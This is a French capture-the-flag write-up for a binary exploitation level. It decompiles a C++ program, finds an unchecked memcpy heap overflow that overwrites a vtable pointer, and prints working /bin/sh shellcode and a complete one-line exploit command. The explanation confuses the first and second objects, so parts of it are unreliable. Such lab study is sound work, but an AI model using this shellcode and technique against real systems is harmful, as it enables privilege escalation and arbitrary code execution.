# Level 9 - Exploitation d'une classe C++ avec fonctions virtuelles

## Objectif
Exploiter un programme C++ qui utilise des classes avec des fonctions virtuelles pour obtenir un shell avec des privilèges élevés.

## Code décompilé

```cpp
int __cdecl main(int argc, const char **argv, const char **envp)
{
  N *v3; // ebx
  N *v4; // ebx
  N *v6; // [esp+1Ch] [ebp-8h]
  if ( argc <= 1 )
    _exit(1);
  v3 = (N *)operator new(0x6Cu);
  N::N(v3, 5);
  v6 = v3;
  v4 = (N *)operator new(0x6Cu);
  N::N(v4, 6);
  N::setAnnotation(v6, (char *)argv[1]);
  return (**(int (__cdecl ***)(N *, N *))v4)(v4, v6);
}

void __cdecl N::N(N *this, int a2)
{
  *(_DWORD *)this = off_8048848;
  *((_DWORD *)this + 26) = a2;
}

void *__cdecl N::setAnnotation(N *this, char *s)
{
  size_t v2; // eax
  v2 = strlen(s);
  return memcpy((char *)this + 4, s, v2);
}

int __cdecl N::operator+(int a1, int a2)
{
  return *(_DWORD *)(a1 + 104) + *(_DWORD *)(a2 + 104);
}

int __cdecl N::operator-(int a1, int a2)
{
  return *(_DWORD *)(a1 + 104) - *(_DWORD *)(a2 + 104);
}
```

## Analyse du programme
1. Le programme crée deux objets de la classe `N` en allouant 0x6C (108) octets pour chacun.
2. Il initialise ces objets avec les valeurs 5 et 6 respectivement.
3. Il appelle `setAnnotation` sur le premier objet avec l'argument fourni par l'utilisateur.
4. Enfin, il appelle une fonction virtuelle du second objet.

## Vulnérabilité
La fonction `setAnnotation` utilise `memcpy` sans vérifier la taille de l'input, permettant un dépassement de tampon (buffer overflow). Elle copie les données à partir de l'offset 4 de l'objet.

## Stratégie d'exploitation
1. Écraser le pointeur de fonction virtuelle du premier objet (v6).
2. Le faire pointer vers notre shellcode.

## Composants de l'exploit
1. **Adresse du shellcode**: `0x804a00c`
   - C'est l'endroit où notre shellcode sera placé en mémoire.

2. **Shellcode**: 
   ```
   \x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80
   ```
   - Ce code assembleur exécute `/bin/sh` quand il est exécuté.

3. **NOP sled**: 
   - Une série d'instructions "No Operation" pour augmenter la probabilité de tomber sur notre shellcode.

4. **Structure de la payload**:
   - Adresse du shellcode (4 bytes)
   - Shellcode (21 bytes)
   - NOP sled (83 bytes)
   - Adresse du shellcode répétée (4 bytes)

## Commande d'exploitation
```
./level9 $(python -c 'print "\x0c\xa0\x04\x08" + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "\x90" * 83 + "\x0c\xa0\x04\x08"')
```

## Explication de la commande
1. `\x0c\xa0\x04\x08`: Adresse du shellcode (en little-endian).
2. `\x6a\x0b...`: Le shellcode lui-même.
3. `"\x90" * 83`: NOP sled pour remplir l'espace.
4. `\x0c\xa0\x04\x08`: Répétition de l'adresse du shellcode pour écraser le pointeur de fonction virtuelle.

## Fonctionnement
1. Le programme copie notre payload dans le premier objet (v6) à partir de l'offset 4.
2. Notre payload écrase le pointeur de fonction virtuelle du premier objet.
3. Quand le programme essaie d'appeler la fonction virtuelle, il saute à notre shellcode.
4. Le shellcode s'exécute, nous donnant un shell avec des privilèges élevés.

## Conclusion
Cette exploitation utilise une combinaison de dépassement de tampon et de manipulation de pointeurs de fonctions virtuelles en C++ pour exécuter du code arbitraire et obtenir un accès privilégié au système. La compréhension de la disposition mémoire des objets C++ et du mécanisme des fonctions virtuelles est cruciale pour cette exploitation.